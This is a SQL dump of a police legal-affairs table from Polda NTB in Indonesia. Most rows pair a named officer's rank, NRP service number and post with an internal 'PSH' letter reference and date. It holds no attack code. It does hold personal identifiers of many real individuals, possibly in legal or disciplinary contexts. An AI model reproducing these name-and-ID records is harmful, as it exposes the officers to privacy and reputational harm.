INSERT INTO `pendapat_saran` VALUES (93, 'PSH AIPDA I KETUT KARYAWAN NRP 84020137, Jabatan Ps.Pamin 6 Subbagrenmin Ditresnarkoba Polda NTB', '2021-11-05', 'B/ND-275/XI/HUK.12.10./2021/Ditresnarkoba', 'PSH AIPDA I KETUT KARYAWAN NRP 84020137, Jabatan Ps.Pamin 6 Subbagrenmin Ditresnarkoba Polda NTB', NULL, 'Administrator', '2021-11-23 13:30:07', '2021-11-23 13:30:07');
INSERT INTO `pendapat_saran` VALUES (94, 'PSH BRIPTU LALU DANI WAHYU HIDAYAT NRP 94120603, Jabatan Ba Polres Bima Kota', '2021-11-04', 'B/937/XI/HUK.12.10./2021', 'PSH BRIPTU LALU DANI WAHYU HIDAYAT NRP 94120603, Jabatan Ba Polres Bima Kota', NULL, 'Administrator', '2021-11-23 13:34:03', '2021-11-23 13:34:03');
INSERT INTO `pendapat_saran` VALUES (95, 'PSH BRIPKA MULIONO NRP 76061080, Jabatan lama Ba Polres Jabatan baru Ba Sat Sabhara Polres Sumbawa Barat.', '2020-11-23', 'R/1062/XII/HUK.12.10./2020', 'PSH BRIPKA MULIONO NRP 76061080, Jabatan lama Ba Polres Jabatan baru Ba Sat Sabhara Polres Sumbawa Barat.', NULL, 'Administrator', '2021-12-13 11:53:06', '2021-12-13 11:53:06');
INSERT INTO `pendapat_saran` VALUES (96, 'PSH SAMSUL HADI NRP 80010853, Jabatan Anggota Ba Sat Sabhara Polres Bima Kota.', '2021-03-04', 'B/ND-102/III/HUK.12.10./2021/Bidpropam', 'PSH SAMSUL HADI NRP 80010853, Jabatan Anggota Ba Sat Sabhara Polres Bima Kota.', NULL, 'Administrator', '2021-12-13 11:57:37', '2021-12-13 11:57:37');
INSERT INTO `pendapat_saran` VALUES (97, 'PSH BRIGADIR M.ROFIQ NRP 71030311, Jabatan Ba Yanma Polda NTB.', '2021-03-08', 'B/ND-122/III/HUK.12.10/2021/Ditsampata', 'PSH BRIGADIR M.ROFIQ NRP 71030311, Jabatan Ba Yanma Polda NTB.', NULL, 'Administrator', '2021-12-13 12:00:51', '2021-12-13 12:00:51');
INSERT INTO `pendapat_saran` VALUES (98, 'PSH BRIPTU FALLAN FARDA WALEWANGKO NRP 95030427, Jabatan Bamin Subbagrenmin Bidkeu  Polda  NTB', '2021-05-21', 'B/ND-79/V/HUKL.12.10./2021/Bidkeu', 'PSH BRIPTU FALLAN FARDA WALEWANGKO NRP 95030427, Jabatan Bamin Subbagrenmin Bidkeu  Polda  NTB', NULL, 'Administrator', '2021-12-13 12:05:37', '2021-12-13 12:05:37');
INSERT INTO `pendapat_saran` VALUES (99, 'PSH BHARATU YASSER RAMADHAN NRP 93030068, Jabatan Ta. Logistik Batalyon C Pelopor Satbrimob Polda NTB', '2021-04-22', 'B/ND-215/IV/HUK.12.10./2021/Bidpropam', 'PSH BHARATU YASSER RAMADHAN NRP 93030068, Jabatan Ta. Logistik Batalyon C Pelopor Satbrimob Polda NTB', NULL, 'Administrator', '2021-12-13 12:08:25', '2021-12-13 12:08:25');
INSERT INTO `pendapat_saran` VALUES (100, 'PSH BRIPKA MUHAMMAD ZAINI NRP 84040206, Jabatan Bintara Polres Lombok Timur', '2021-05-26', 'R/08/V/HUK.12.10./2021', 'PSH BRIPKA MUHAMMAD ZAINI NRP 84040206, Jabatan Bintara Polres Lombok Timur', NULL, 'Administrator', '2021-12-13 12:13:15', '2021-12-13 12:13:15');
INSERT INTO `pendapat_saran` VALUES (101, 'PSH IPDA ARICH AS\'ARY NRP 68080618, KBO Sat Samapta Polres Bima Dkk', '2021-08-18', 'B/ND-558/VIII/HUK.12.10/2021', 'PSH IPDA ARICH AS\'ARY NRP 68080618, KBO Sat Samapta Polres Bima Dkk', NULL, 'Administrator', '2021-12-13 12:20:03', '2021-12-13 12:20:03');
INSERT INTO `pendapat_saran` VALUES (103, 'PSH AIPDA BUDI HARJANTO NRP 81100127, Jabatan Ka SPKT 3 Polsek Kediri Polres Lombok Barat.', '2021-07-28', 'R/392/VII/HUK.12.10./2021', 'PSH AIPDA BUDI HARJANTO NRP 81100127, Jabatan Ka SPKT 3 Polsek Kediri Polres Lombok Barat.', NULL, 'Administrator', '2021-12-13 12:41:25', '2021-12-13 12:41:25');
INSERT INTO `pendapat_saran` VALUES (104, 'PSH AIPDA DIDI JUNAIDIN NRP 79060310 Jabatan PS.Pamin Subden 4 Datasemen Gegana, Kesatuan Brimob Polda NTB.', '2021-08-04', 'B/ND-99/VIII/HUK.12.10./2021/Bm.NTB', 'PSH AIPDA DIDI JUNAIDIN NRP 79060310 Jabatan PS.Pamin Subden 4 Datasemen Gegana, Kesatuan Brimob Polda NTB.', NULL, 'Administrator', '2021-12-20 10:45:47', '2021-12-20 10:45:47');
INSERT INTO `pendapat_saran` VALUES (105, 'PSH BRIPKA RAMLI AHMAD NRP 85121713, Jabatan Ba Polsek Pujut Polres Lombok Tengah.', '2021-07-28', 'R/578/VII/HUK.12.10./2021', 'PSH BRIPKA RAMLI AHMAD NRP 85121713, Jabatan Ba Polsek Pujut Polres Lombok Tengah.', NULL, 'Administrator', '2021-12-20 11:59:23', '2021-12-20 11:59:23');
INSERT INTO `pendapat_saran` VALUES (106, 'PSH BRIPKA FARHAN WAHYUDI NRP 79030670, Jabatan anggota Sat Lantas Polres  Lombok Tengah.', '2021-08-19', 'R/664/VIII/HUK.12.10./2021', 'PSH BRIPKA FARHAN WAHYUDI NRP 79030670, Jabatan anggota Sat Lantas Polres  Lombok Tengah.', NULL, 'Administrator', '2021-12-20 12:03:39', '2021-12-20 12:03:39');
INSERT INTO `pendapat_saran` VALUES (107, 'PSH IPDA ARICH AS\'ARY NRP 68080618, KBO Sat Samapta Polres Bima Dkk', '2021-08-18', 'B/ND-558/VIII/HUK.12.10./2021', 'PSH IPDA ARICH AS\'ARY NRP 68080618, KBO Sat Samapta Polres Bima Dkk', NULL, 'Administrator', '2021-12-20 12:06:38', '2021-12-20 12:06:38');
INSERT INTO `pendapat_saran` VALUES (109, 'PSH BRIPTU ABDUL HARIS NRP 86030270, Jabatan Ba Polres Dompu.', '2021-09-20', 'R/69/IX/REN.4.1.3/2021', 'PSH BRIPTU ABDUL HARIS NRP 86030270, Jabatan Ba Polres Dompu.', NULL, 'Administrator', '2021-12-20 12:13:48', '2021-12-20 12:13:48');
INSERT INTO `pendapat_saran` VALUES (110, 'PSH BRIGADIR DWI ADI PRAMANA NRP 87041190, Jabatan Ba Humas Polres Bima', '2021-09-09', 'R/646/IX/HUK.6.6./2021/Res Bima', 'PSH BRIGADIR DWI ADI PRAMANA NRP 87041190, Jabatan Ba Humas Polres Bima', NULL, 'Administrator', '2021-12-20 12:17:08', '2021-12-20 12:17:08');
INSERT INTO `pendapat_saran` VALUES (111, 'PSH BRIGADIR JUHARDI NRP 87051653, Jabatan anggota Ba Unit Intelkam Polsek Praya  Timur', '2021-09-16', 'R/748/IX/HUK.12.10./2021', 'PSH BRIGADIR JUHARDI NRP 87051653, Jabatan anggota Ba Unit Intelkam Polsek Praya  Timur', NULL, 'Administrator', '2021-12-20 12:20:51', '2021-12-20 12:20:51');
INSERT INTO `pendapat_saran` VALUES (112, 'PSH BRIGADIR ADY SYOFYAN NRP 88070538, Jabatan Ba Polres Bima', '2021-09-09', 'B/510/VI/HUK.12.10./2021', 'PSH BRIGADIR ADY SYOFYAN NRP 88070538, Jabatan Ba Polres Bima', NULL, 'Administrator', '2021-12-20 12:23:39', '2021-12-20 12:23:39');
INSERT INTO `pendapat_saran` VALUES (113, 'PSH BRIGADIR MOH.SYUKRI NRP 78120156, Jabatan Ba Sium Polres Sumbawa Barat.', '2021-08-25', 'R/533/VIII/HUK.12.10./2021', 'PSH BRIGADIR MOH.SYUKRI NRP 78120156, Jabatan Ba Sium Polres Sumbawa Barat.', NULL, 'Administrator', '2021-12-20 12:27:11', '2021-12-20 12:27:11');
INSERT INTO `pendapat_saran` VALUES (114, 'PSH BHARATU RAHMAT ARDIANSYAH NRP 94060240, Jabatan Tamtama Intelmob Satbrimob Polda NTB', '2021-09-07', 'B/ND-600/IX/HUK.12.10./2021', 'PSH BHARATU RAHMAT ARDIANSYAH NRP 94060240, Jabatan Tamtama Intelmob Satbrimob Polda NTB', NULL, 'Administrator', '2021-12-20 12:29:55', '2021-12-20 12:29:55');
INSERT INTO `pendapat_saran` VALUES (116, 'PSH BRIGADIR DEDY ARIADI NRP 83120555, Jabatan Sat Samapta Polres Bima Kota.', '2021-11-05', 'B/938/XI/HUK.12.10./2021', 'PSH BRIGADIR DEDY ARIADI NRP 83120555, Jabatan Sat Samapta Polres Bima Kota.', NULL, 'Administrator', '2021-12-21 11:22:25', '2021-12-21 11:22:25');
INSERT INTO `pendapat_saran` VALUES (117, 'PSH AIPDA I KETUT KARYAWAN NRP 84020137, Jabatan PS.Pamin 6 Subbagrenmin Ditresnarkoba Polda NTB.', '2021-11-04', 'B/ND-275/XI/HUK.12.10./2021/Ditresnarkoba', 'PSH AIPDA I KETUT KARYAWAN NRP 84020137, Jabatan PS.Pamin 6 Subbagrenmin Ditresnarkoba Polda NTB.', NULL, 'Administrator', '2021-12-21 11:25:37', '2021-12-21 11:25:37');
INSERT INTO `pendapat_saran` VALUES (118, 'PSH BRIPTU NANDIISWANTO NRP 94120366, Jabatan Banit 1 Sat Samapta Polres Bima.', '2021-11-06', 'B/108/X/HUK.12.10./2021', 'PSH BRIPTU NANDIISWANTO NRP 94120366, Jabatan Banit 1 Sat Samapta Polres Bima.', NULL, 'Administrator', '2021-12-22 11:26:09', '2021-12-22 11:26:09');
INSERT INTO `pendapat_saran` VALUES (119, 'PSH AIPDA LALU ZANWIN,S.H. NRP 82070492, Jabatan Banit SPKT III (sebelumnya Bhabinkamtibmas Desa Sambelia Polsek Sambelia), Kesatuan Polres Lombok Timur.', '2021-12-02', 'B/18/XII/HUK.12.10./2021', 'PSH AIPDA LALU ZANWIN,S.H. NRP 82070492, Jabatan Banit SPKT III (sebelumnya Bhabinkamtibmas Desa Sambelia Polsek Sambelia), Kesatuan Polres Lombok Timur.', NULL, 'Administrator', '2021-12-22 11:29:43', '2021-12-22 11:29:43');
INSERT INTO `pendapat_saran` VALUES (120, 'PSH BRIPKA GEDE WINDU PRAYOGA NRP 86120013, Jabatan Ps.Kanit Bin Polmas Sat Binmas Polres Sumbawa.', '2021-12-08', 'B/97/XII/HUK.12.10./2021/Siepropam', 'PSH BRIPKA GEDE WINDU PRAYOGA NRP 86120013, Jabatan Ps.Kanit Bin Polmas Sat Binmas Polres Sumbawa.', NULL, 'Administrator', '2021-12-23 13:03:05', '2021-12-23 13:03:05');
INSERT INTO `pendapat_saran` VALUES (121, 'PSH IPTU NURDIN NRP 70010439, Jabatan Kapolsek Tambora Polres Bima', '2021-11-16', 'B/ND-689/XI/HUK.12.10./2021/Res Bima', 'PSH IPTU NURDIN NRP 70010439, Jabatan Kapolsek Tambora Polres Bima', NULL, 'Administrator', '2021-12-23 13:06:35', '2021-12-23 13:06:35');
INSERT INTO `pendapat_saran` VALUES (122, 'PSH BRIPTU LALU GERI EFREDI ANGGARA NRP 92080591, Jabatan Bamin  Siwas Polres Bima Kota.', '2021-11-03', 'B/926/XI/HUK.12.10./2021/Res Bima Kota', 'PSH BRIPTU LALU GERI EFREDI ANGGARA NRP 92080591, Jabatan Bamin  Siwas Polres Bima Kota.', NULL, 'Administrator', '2021-12-23 13:08:35', '2021-12-23 13:08:35');
INSERT INTO `pendapat_saran` VALUES (123, 'PSH BRIPKA SYAHRUL AKBAR,S.H. NRP 87040602, Jabatan Anggota Sat Samapta Polres Bima Kota.', '2021-11-15', 'R/953/XI/HUK.12.10./2021', 'PSH BRIPKA SYAHRUL AKBAR,S.H. NRP 87040602, Jabatan Anggota Sat Samapta Polres Bima Kota.', NULL, 'Administrator', '2021-12-23 13:11:54', '2021-12-23 13:11:54');
INSERT INTO `pendapat_saran` VALUES (124, 'PSH BRIGADIR IMANSYAH dan BHARATU SALIM NRP 92050484, Jabatan  anggota  Kompi  1 Batalyon C Pelopor Sat  Brimob Polda NTB', '2021-11-25', 'B/ND-176/XI/HUK.12.10./2021/Bm.NTB', 'PSH BRIGADIR IMANSYAH dan BHARATU SALIM NRP 92050484, Jabatan  anggota  Kompi  1 Batalyon C Pelopor Sat  Brimob Polda NTB', NULL, 'Administrator', '2021-12-23 13:14:56', '2021-12-23 13:14:56');
INSERT INTO `pendapat_saran` VALUES (125, 'PSH BRIPKA PUTU ERIK WARDANA NRP 86040073, Jabatan P.S.Kanit Reskrim Polsek Tambora Kesatuan Polres Bima.', '2021-11-16', 'R/688/XI/HUK.12.10./2021/Res Bima', 'PSH BRIPKA PUTU ERIK WARDANA NRP 86040073, Jabatan P.S.Kanit Reskrim Polsek Tambora Kesatuan Polres Bima.', NULL, 'Administrator', '2021-12-23 13:17:09', '2021-12-23 13:17:09');
INSERT INTO `pendapat_saran` VALUES (126, 'PSH BRIPTU IMADE PURNAMA ARTHE JAYA NRP 93060473, Jabatan Bamin Intelmob Kompi 1 Batalyon A Pelopor Sat Brimob Polda NTB.', '2021-11-08', 'B/ND-166/XI/HUK.12.10./2021/Bm.NTB', 'PSH BRIPTU IMADE PURNAMA ARTHE JAYA NRP 93060473, Jabatan Bamin Intelmob Kompi 1 Batalyon A Pelopor Sat Brimob Polda NTB.', NULL, 'Administrator', '2021-12-23 13:20:46', '2021-12-23 13:20:46');
INSERT INTO `pendapat_saran` VALUES (127, 'PSH BRIGADIR I GEDE SUKARSA PUTRA NRP 88050155, Jabatan Bamin Sidokkes Polres Sumbawa.', '2021-12-09', 'R/184/XII/HUK.12.10./2021', 'PSH BRIGADIR I GEDE SUKARSA PUTRA NRP 88050155, Jabatan Bamin Sidokkes Polres Sumbawa.', NULL, 'Administrator', '2021-12-23 13:23:43', '2021-12-23 13:23:43');
INSERT INTO `pendapat_saran` VALUES (128, 'PSH BRIGADIR SULGIANTO NRP 82070691, Jabatan Anggota Batallyon A Sat Brimob Polda NTB.', '2021-10-27', 'B/ND-703/X/HUK.12.10./2021/Bidpropam', 'PSH BRIGADIR SULGIANTO NRP 82070691, Jabatan Anggota Batallyon A Sat Brimob Polda NTB.', NULL, 'Administrator', '2021-12-23 13:27:38', '2021-12-23 13:27:38');
INSERT INTO `pendapat_saran` VALUES (129, 'PSH BRIGADIR ERWIN HARIYADI NRP 87071579, Jabatan Ba Subditdalmas Kompi 2 Ditsamapta Polda NTB.', '2021-10-26', 'R/ND-357/X/HUK.12.10./2021/Ditsamapta', 'PSH BRIGADIR ERWIN HARIYADI NRP 87071579, Jabatan Ba Subditdalmas Kompi 2 Ditsamapta Polda NTB.', NULL, 'Administrator', '2021-12-23 13:31:58', '2021-12-23 13:31:58');
INSERT INTO `pendapat_saran` VALUES (130, 'PSH BRIPKA SAFRIN NRP 78061073, Jabatan Ba Polres Dompu.', '2021-05-31', 'B/36/XI/HUK.12.10./2021', 'PSH BRIPKA SAFRIN NRP 78061073, Jabatan Ba Polres Dompu.', NULL, 'Administrator', '2021-12-23 13:38:13', '2021-12-23 13:38:13');
INSERT INTO `pendapat_saran` VALUES (131, 'PSH IPTU SUMARDIN NRP 73120744, Jabatan Kapolsek Belo Polres Bima.', '2021-10-22', 'B/102/X/HUK.12.10./2021', 'PSH IPTU SUMARDIN NRP 73120744, Jabatan Kapolsek Belo Polres Bima.', NULL, 'Administrator', '2021-12-23 13:43:19', '2021-12-23 13:43:19');
INSERT INTO `pendapat_saran` VALUES (132, 'PSH IPTU WILLEM BELSERAN NRP 68030181, Jabatan Kasat Tahti Polres Bima.', '2021-10-27', 'B/104/X/HUK.12.10./2021', 'PSH IPTU WILLEM BELSERAN NRP 68030181, Jabatan Kasat Tahti Polres Bima.', NULL, 'Administrator', '2021-12-23 14:19:55', '2021-12-23 14:19:55');
INSERT INTO `pendapat_saran` VALUES (133, 'PSH BRIPTU MUHAMMAD AWALUDIN BAYU NRP 95040335, Jabatan Anggota  Ba Polres Lombok Barat', '2021-11-03', 'B/107/X/HUK.12.10./2021', 'PSH BRIPTU MUHAMMAD AWALUDIN BAYU NRP 95040335, Jabatan Anggota  Ba Polres Lombok Barat', NULL, 'Administrator', '2021-12-23 14:27:54', '2021-12-23 14:27:54');
INSERT INTO `pendapat_saran` VALUES (134, 'PSH BRIGADIR M.ARIFUDDIN S.Sos NRP 92060390 dan BRIPTU BIMO PRATAFA R.A.S., S.H. NRP 95030356, Jabatan Anggota Kompi 1 Batalyon C Pelopor Brimob Polda NTB.', '2022-01-03', 'B/ND-1/I/HUK.12.10./2022/Bm.NTB', 'PSH BRIGADIR M.ARIFUDDIN S.Sos NRP 92060390 dan BRIPTU BIMO PRATAFA R.A.S., S.H. NRP 95030356, Jabatan Anggota Kompi 1 Batalyon C Pelopor Brimob Polda NTB.', NULL, 'Administrator', '2022-01-17 13:23:22', '2022-01-17 13:23:22');
INSERT INTO `pendapat_saran` VALUES (135, 'PSH AIPDA AZWAR ARNAS NRP 82060738, Jabatan Ba Si TIK Polres Bima Kota', '2022-01-25', 'R/I/12.10./2022/Siepropam', 'PSH AIPDA AZWAR ARNAS NRP 82060738, Jabatan Ba Si TIK Polres Bima Kota', NULL, 'Administrator', '2022-01-27 14:09:12', '2022-01-27 14:09:12');
INSERT INTO `pendapat_saran` VALUES (136, 'PSH BRIPDA DIMAS RIFQI NUR NRP 01070098, Jabatan Bamin Urmintu Subbagrenmin Ditpamobvit Polda NTB.', '2022-01-20', 'B/ND-19/I/HUK.12.10./2022/Ditpamobvit', 'PSH BRIPDA DIMAS RIFQI NUR NRP 01070098, Jabatan Bamin Urmintu Subbagrenmin Ditpamobvit Polda NTB.', NULL, 'Administrator', '2022-01-27 14:12:01', '2022-01-27 14:12:01');
INSERT INTO `pendapat_saran` VALUES (137, 'PSH BRIGADIR DIDIQ HADISISWANTO NRP 83030320, Jabatan Ba Polres Dompu.', '2021-12-30', 'R/102/XII/REN.4.1.3./2021', 'PSH BRIGADIR DIDIQ HADISISWANTO NRP 83030320, Jabatan Ba Polres Dompu.', NULL, 'Administrator', '2022-01-27 14:13:59', '2022-01-27 14:13:59');
INSERT INTO `pendapat_saran` VALUES (138, 'PSH AIPDA M.NUH MUSLIM, S.H. NRP 83080835, Jabatan PS.Kanit II Jaga Tahanan Subdit pamtah Dittahti Polda NTB, bersama 3 anggotanya.', '2022-01-21', 'B/ND-41/I/HUK.12.10./2022/Dittahti', 'PSH AIPDA M.NUH MUSLIM, S.H. NRP 83080835, Jabatan PS.Kanit II Jaga Tahanan Subdit pamtah Dittahti Polda NTB, bersama 3 anggotanya.', NULL, 'Administrator', '2022-01-27 14:17:57', '2022-01-27 14:17:57');
INSERT INTO `pendapat_saran` VALUES (139, 'PSH BHARAKA MIFTAHUL MIZAN NRP 93110313, Jabatan Banum Bagops Kesatuan Brimob Polda NTB.', '2022-01-25', 'B/ND-19/I/HUK.12.10./2022/Bm.NTB', 'PSH BHARAKA MIFTAHUL MIZAN NRP 93110313, Jabatan Banum Bagops Kesatuan Brimob Polda NTB.', NULL, 'Administrator', '2022-01-27 14:20:20', '2022-01-27 14:20:20');
INSERT INTO `pendapat_saran` VALUES (141, 'PSH IPTU MASTUR SI.P NRP 67110382, Jabatan Ps.Paur Siaga II SPKT Polda NTB.', '2022-02-02', 'B/ND-68/II/HUK.12.10.2022./SPKT', 'PSH IPTU MASTUR SI.P NRP 67110382, Jabatan Ps.Paur Siaga II SPKT Polda NTB.', NULL, 'Administrator', '2022-02-09 11:42:18', '2022-02-09 11:42:18');
INSERT INTO `pendapat_saran` VALUES (142, 'PSH BRIPKA JOKHAN WAHYUDI NRP 80010656 Jabatan Ba Samapta Polres Sumbawa Barat', '2021-12-18', 'R/661/XII/12.10./2021', 'PSH BRIPKA JOKHAN WAHYUDI NRP 80010656 Jabatan Ba Samapta Polres Sumbawa Barat', NULL, 'Administrator', '2022-02-15 11:06:46', '2022-02-15 11:06:46');
INSERT INTO `pendapat_saran` VALUES (143, 'PSH BRIPKA WAWAN SATRYA UTAMA NRP 87121058 Jabatan Banit 2 Subdit 3 Ditintelkam Polda NTB.', '2022-02-09', 'B/ND-98/II/HUK.12.10./2022/Bidkum', 'PSH BRIPKA WAWAN SATRYA UTAMA NRP 87121058 Jabatan Banit 2 Subdit 3 Ditintelkam Polda NTB.', NULL, 'Administrator', '2022-02-15 12:04:47', '2022-02-15 12:04:47');
INSERT INTO `pendapat_saran` VALUES (144, 'PSH AIPTU I KETUT MARGA UTAMA NRP 77050218, Jabatan PS.Panit I Unit 3 Subdit II Ditreskrimum Polda NTB (penyidik pembantu)', '2022-02-17', 'B/ND-117/II/HUK.12.10./2022/Bidpropam', 'PSH AIPTU I KETUT MARGA UTAMA NRP 77050218, Jabatan PS.Panit I Unit 3 Subdit II Ditreskrimum Polda NTB (penyidik pembantu)', NULL, 'Administrator', '2022-03-04 13:01:31', '2022-03-04 13:01:31');
INSERT INTO `pendapat_saran` VALUES (145, 'PSH BRIPTU I NYOMAN OKA MAHENDRA NRP 94100495, Jabatan Anggota Kompi 2 Batalyon C Pelopor Satbrimob Polda NTB.', '2022-02-17', 'B/ND-122/II/HUK.12.10./2022/Bidpropam', 'PSH BRIPTU I NYOMAN OKA MAHENDRA NRP 94100495, Jabatan Anggota Kompi 2 Batalyon C Pelopor Satbrimob Polda NTB.', NULL, 'Administrator', '2022-04-04 11:24:54', '2022-06-06 12:59:17');
INSERT INTO `pendapat_saran` VALUES (146, 'PSH AIPTU WIDI SISWANTO, NRP 80060044, Jabatan Ba Dit Lantas Polda NTB.', '2022-01-20', 'B/ND-40/I/HUK.12.10./2022/Dit Lantas', 'PSH AIPTU WIDI SISWANTO, NRP 80060044, Jabatan Ba Dit Lantas Polda NTB.', NULL, 'Administrator', '2022-06-06 12:50:28', '2022-06-06 12:50:28');
INSERT INTO `pendapat_saran` VALUES (147, 'PSH BRIGADIR JASMAN WIJAYA, NRP 89040539, Jabatan Baurkeu Subbagrenmin Ditpamobvit Polda NTB.', '2022-02-10', 'B/ND-36/II/HUK.12.10./2022/Ditpamobvit', 'PSH BRIGADIR JASMAN WIJAYA, NRP 89040539, Jabatan Baurkeu Subbagrenmin Ditpamobvit Polda NTB.', NULL, 'Administrator', '2022-06-06 12:54:49', '2022-06-06 12:54:49');
INSERT INTO `pendapat_saran` VALUES (148, 'PSH BRIPKA I GUSTI BAGUS NGURAH OKADA NRP 88040789, Jabatan Sat Reskrim Kesatuan Polres Lombok Barat', '2022-02-10', 'R/31/II/HUK12.10./2022/SPKT', 'PSH BRIPKA I GUSTI BAGUS NGURAH OKADA NRP 88040789, Jabatan Sat Reskrim Kesatuan Polres Lombok Barat', NULL, 'Administrator', '2022-06-06 12:57:45', '2022-06-06 12:57:45');
INSERT INTO `pendapat_saran` VALUES (149, 'PSH BRIPKA ABDUL AZIZ, NRP 78010483, Jabatan Banum Uryankom Subdit Tekkom Bid Tik Polda NTB.', '2022-02-09', 'B/ND-97/II/HUK.12.10./2022/Bidpropam', 'PSH BRIPKA ABDUL AZIZ, NRP 78010483, Jabatan Banum Uryankom Subdit Tekkom Bid Tik Polda NTB.', NULL, 'Administrator', '2022-06-06 13:04:39', '2022-06-06 13:04:39');
INSERT INTO `pendapat_saran` VALUES (150, 'PSH AIPDA LALU ARYA WIRECHANE NRP 82050079, Jabatan Bintaran Polres Sumbawa', '2022-03-15', 'R/22/III/HUK.9.1./2022', 'PSH AIPDA LALU ARYA WIRECHANE NRP 82050079, Jabatan Bintaran Polres Sumbawa', NULL, 'Administrator', '2022-06-06 13:10:12', '2022-06-06 13:10:12');
INSERT INTO `pendapat_saran` VALUES (151, 'PSH AIPTU LALU BURHANUDIN NRP 72050452, Jabatan Banit Samapta Polsek Gerung Polres Lombok Barat.', '2022-03-30', 'B/280/III/HUK.12.10./2022', 'PSH AIPTU LALU BURHANUDIN NRP 72050452, Jabatan Banit Samapta Polsek Gerung Polres Lombok Barat.', NULL, 'Administrator', '2022-06-06 13:14:04', '2022-06-06 13:14:04');
INSERT INTO `pendapat_saran` VALUES (152, 'PSH BRIPTUN RANGGA SATRIA, S.H. NRP 96010151, Jabatan Banit Reskrim Polsek Rasanae Barat Polres Bima Kota.', '2022-03-25', 'B/224/III/HUK.12.10/2022', 'PSH BRIPTUN RANGGA SATRIA, S.H. NRP 96010151, Jabatan Banit Reskrim Polsek Rasanae Barat Polres Bima Kota.', NULL, 'Administrator', '2022-06-06 13:16:23', '2022-06-06 13:16:23');
INSERT INTO `pendapat_saran` VALUES (153, 'PSH AKP DANIEL PARTOGI SIMANGUNGSONG, S.I.K. NRP 89050790, Jabatan Panit 1 Unit 2 Subdit II Ditreskrimum Polda NTB.', '2022-03-29', 'B/ND-165/III/HUK.12.10./2022/Bidpropam', 'PSH AKP DANIEL PARTOGI SIMANGUNGSONG, S.I.K. NRP 89050790, Jabatan Panit 1 Unit 2 Subdit II Ditreskrimum Polda NTB.', NULL, 'Administrator', '2022-06-06 13:20:27', '2022-06-06 13:20:27');
INSERT INTO `pendapat_saran` VALUES (154, 'PSH BRIPKA ABDUL HAMID, Jabatan Ba Paminal Sipropam Polres Bima', '2022-03-15', 'B/294/III/HUK.6.6./2022/Res Bima', 'PSH BRIPKA ABDUL HAMID, Jabatan Ba Paminal Sipropam Polres Bima', NULL, 'Administrator', '2022-06-06 13:22:59', '2022-06-06 13:22:59');
INSERT INTO `pendapat_saran` VALUES (155, 'PSH BHARAKA LALU AKMALUDDIN MARDANI, NRP 92030186', '2022-04-04', 'B/ND-176/IV/HUK.12.10./2022', 'PSH BHARAKA LALU AKMALUDDIN MARDANI, NRP 92030186', NULL, 'Administrator', '2022-06-06 13:27:04', '2022-06-06 13:27:04');
INSERT INTO `pendapat_saran` VALUES (156, 'PSH ZUAINI IRFAN SAHID', '2022-04-21', 'B/389/IV/HUK./2022/Res Bima', 'PSH ZUAINI IRFAN SAHID', NULL, 'Administrator', '2022-06-06 13:29:59', '2022-06-06 13:29:59');
INSERT INTO `pendapat_saran` VALUES (157, 'PSH IPDA ICHWAN SATRIAWAN, S.H. NRP 78050224 DKK, Jabatan KBO Sat Reskrim Kesatuan Polres Lombok Tengah', '2022-04-20', 'R/239/IV/HUK.12.10./2022', 'PSH IPDA ICHWAN SATRIAWAN, S.H. NRP 78050224 DKK, Jabatan KBO Sat Reskrim Kesatuan Polres Lombok Tengah', NULL, 'Administrator', '2022-06-06 13:32:52', '2022-06-06 13:32:52');
INSERT INTO `pendapat_saran` VALUES (158, 'PSH BRIPKA LALU USMAN, NRP 81061080, Jabatan Anggota Kompi 4 Batalyon A Pelopor, Kesatuan Brimob Polda NTB', '2022-04-19', 'B/ND-64/IV/HUK.12.10./2022/Bm.NTB', 'PSH BRIPKA LALU USMAN, NRP 81061080, Jabatan Anggota Kompi 4 Batalyon A Pelopor, Kesatuan Brimob Polda NTB', NULL, 'Administrator', '2022-06-06 13:35:32', '2022-06-06 13:35:32');
INSERT INTO `pendapat_saran` VALUES (159, 'PSH BHARAKA KHAERUL FATONI, NRP 93020078, Jabatan Anggota Kompi 2 Batalyon A Pelopor, Kesatuan Brimob Polda NTB', '2022-04-26', 'B/ND-66/IV/HUK.12.10./2022/Bm.NTB', 'PSH BHARAKA KHAERUL FATONI, NRP 93020078, Jabatan Anggota Kompi 2 Batalyon A Pelopor, Kesatuan Brimob Polda NTB', NULL, 'Administrator', '2022-06-06 13:38:26', '2022-06-06 13:38:26');
INSERT INTO `pendapat_saran` VALUES (160, 'PSH AIPDA LALU AKHMAD AFFANDI, NRP 780110976, Jabatan Bintara Sat Sabhara Polres Lombok Barat', '2022-04-28', 'R/251/IV/HUK.12.10./2022', 'PSH AIPDA LALU AKHMAD AFFANDI, NRP 780110976, Jabatan Bintara Sat Sabhara Polres Lombok Barat', NULL, 'Administrator', '2022-06-08 12:08:00', '2022-06-08 12:08:00');
INSERT INTO `pendapat_saran` VALUES (161, 'PSH BRIPTU ALIFHYA JUANG MAHARDIKA NRP 94080423, Jabatan Brigadir Sat Samapta Polresta Mataram.', '2022-05-16', 'R/363/V/HUK.12.10./2022', 'PSH BRIPTU ALIFHYA JUANG MAHARDIKA NRP 94080423, Jabatan Brigadir Sat Samapta Polresta Mataram.', NULL, 'Administrator', '2022-06-08 12:10:58', '2022-06-08 12:10:58');
INSERT INTO `pendapat_saran` VALUES (162, 'PSH AIPDA SAHABUDIN NRP 81010265, Jabatan Bintara Polres Sumbawa kesatuan Polres Sumbawa.', '2022-05-10', 'R/46/V/HUK.9.1/2022', 'PSH AIPDA SAHABUDIN NRP 81010265, Jabatan Bintara Polres Sumbawa kesatuan Polres Sumbawa.', NULL, 'Administrator', '2022-06-08 12:13:43', '2022-06-08 12:13:43');
INSERT INTO `pendapat_saran` VALUES (163, 'PSH BRIPKA SYAHRURRAHMAN NRP 85060013, Jabatan Bamin Subsispenmas Sihumas Polres Dompu.', '2022-04-28', 'R/22/IV/REN.4.1.3./2022', 'PSH BRIPKA SYAHRURRAHMAN NRP 85060013, Jabatan Bamin Subsispenmas Sihumas Polres Dompu.', NULL, 'Administrator', '2022-06-09 15:52:15', '2022-06-09 15:52:15');
INSERT INTO `pendapat_saran` VALUES (164, 'PSH BRIPKA I WAYAN MARDIKA WIJAYA NRP 84071376, Jabatan Brigadir Satuan Samapta Polres Lombok  Barat.', '2022-05-25', 'R/167/V/HUK.12.10./2022', 'PSH BRIPKA I WAYAN MARDIKA WIJAYA NRP 84071376, Jabatan Brigadir Satuan Samapta Polres Lombok  Barat.', NULL, 'Administrator', '2022-06-09 15:59:19', '2022-06-09 15:59:19');

-- ----------------------------
-- Table structure for pendapat_saran_proses
-- ----------------------------
DROP TABLE IF EXISTS `pendapat_saran_proses`;
